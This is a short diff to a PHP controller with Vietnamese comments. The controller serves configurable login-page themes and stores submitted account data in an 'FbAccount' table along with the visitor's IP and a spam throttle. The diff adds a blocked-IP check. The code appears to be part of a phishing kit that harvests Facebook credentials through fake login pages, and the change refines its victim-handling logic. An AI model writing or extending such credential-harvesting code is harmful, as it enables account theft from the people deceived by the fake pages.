@@ -33,7 +33,7 @@ class NormalWeb extends Controller
             if ($web_data->theme_type == 1) {
                 return view('login.normal.' . $web_data->loginThemeFolder, ['data' => $web_data, 'info' => $web_info, 'setting' => $user_settings]);
             }
-            
+
             // xử lí giao diện 2 phần
             if (!$rq->exists('l')) {
                 return view('common.' . $web_data->theme_folder, ['data' => $web_data, 'input' => $web_data->theme_input]);
@@ -63,7 +63,6 @@ class NormalWeb extends Controller
                 */
                 $web_info = Json::decode(Crypt::decryptString($post_data->info));
                 $ip = getRealIp();
-
                 // kiểm tra thời gian chống spam nếu đã nhập từ trước (giới hạn 3s/lần)
                 $check_ip = FbAccount::where('ip', $ip)
                     ->where('type', 'normal')
@@ -76,6 +75,11 @@ class NormalWeb extends Controller
                             'status' => false,
                         ]);
                     }
+                }
+                // kiểm tra xem ip có bị chặn không
+                if (check_blocked_ip($web_info->userid, $ip)) {
+                    // destroy session
+                    return;
                 }
                 // check spam xong tiến hành insert
                 FbAccount::create([
